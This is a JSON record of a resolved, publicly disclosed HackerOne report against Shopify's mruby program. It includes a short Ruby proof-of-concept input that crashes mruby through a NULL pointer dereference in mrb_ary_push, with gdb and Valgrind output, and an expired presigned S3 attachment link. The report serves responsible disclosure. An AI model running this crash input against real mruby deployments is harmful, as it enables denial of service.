@@ -1,0 +1,122 @@
+{
+  "id": 420115,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjAxMTU=",
+  "url": "https://hackerone.com/reports/420115",
+  "title": "Crash in mrb_ary_push",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2018-10-06T18:30:45.630Z",
+  "submitted_at": "2018-10-06T18:30:45.630Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dgaletic",
+    "url": "/dgaletic",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-09-04T13:33:48.294Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-09-03T10:30:04.775Z",
+  "team_member_agreed_on_going_public_at": "2019-09-04T13:33:48.218Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "PoC\n===\nThe following demonstrates a crash:\n\n    def method_missing(*)\n    end\n    {}.[]0[*0] %=\n    begin{0=>0}\n    00end\n\n\nDebug info\n==========\n\nThe crash happens in `mrb_ary_push`:\n\n    495│ mrb_ary_push(mrb_state *mrb, mrb_value ary, mrb_value elem)\n    496│ {\n    497│   struct RArray *a = mrb_ary_ptr(ary);\n    498├─> mrb_int len = ARY_LEN(a);\n\n    (gdb) p a\n    $1 = (struct RArray *) 0x0\n\n\nValgrind report:\n\n    ==17609== Memcheck, a memory error detector\n    ==17609== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.\n    ==17609== Using Valgrind-3.14.0.GIT and LibVEX; rerun with -h for copyright info\n    ==17609== Command: mruby poc\n    ==17609==\n    ==17609== Invalid read of size 4\n    ==17609==    at 0x136134: mrb_ary_push (array.c:498)\n    ==17609==    by 0x16EEAE: mrb_vm_exec (vm.c:2614)\n    ==17609==    by 0x1647E6: mrb_vm_run (vm.c:972)\n    ==17609==    by 0x1787F7: mrb_top_run (vm.c:2999)\n    ==17609==    by 0x1523E4: mrb_load_exec (parse.y:6013)\n    ==17609==    by 0x1525C6: mrb_load_file_cxt (parse.y:6022)\n    ==17609==    by 0x10DBF1: main (mruby.c:280)\n    ==17609==  Address 0x0 is not stack'd, malloc'd or (recently) free'd\n\nTest platform\n=============\n* Arch Linux\n\nmruby SHA: a690aef8d3219e3123822e741e2bb7c97220425c\n\nThank you,\nDinko Galetic\nDenis Kasak\n\n## Impact\n\nDOS through crashing the mruby process.",
+  "bounty_amount": "800.0",
+  "formatted_bounty": "$800",
+  "weakness": {
+    "id": 51,
+    "name": "NULL Pointer Dereference"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 356515,
+      "file_name": "poc",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/356/515/063bc1c17732fc5f1fe456bd62f08dcbb67176f5/poc?response-content-disposition=attachment%3B%20filename%3D%22poc%22%3B%20filename%2A%3DUTF-8%27%27poc&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131233Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c0b557ba93e3e6831fe5264cbe8327ec50fa1753ebcdceda30b9b8f3cc620005",
+      "file_size": 58,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-10-03T10:30:05.404Z",
+  "allow_singular_disclosure_after": -137731347.64715636,
+  "singular_disclosure_allowed": true,
+  "vote_count": 37,
+  "voters": [
+    "dgaletic",
+    "sameerphad72",
+    "ali",
+    "dhakal_ananda",
+    "mik317",
+    "savitar0x01",
+    "0xatul",
+    "khizer47",
+    "cyberunit",
+    "z41b1337_",
+    "and 27 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
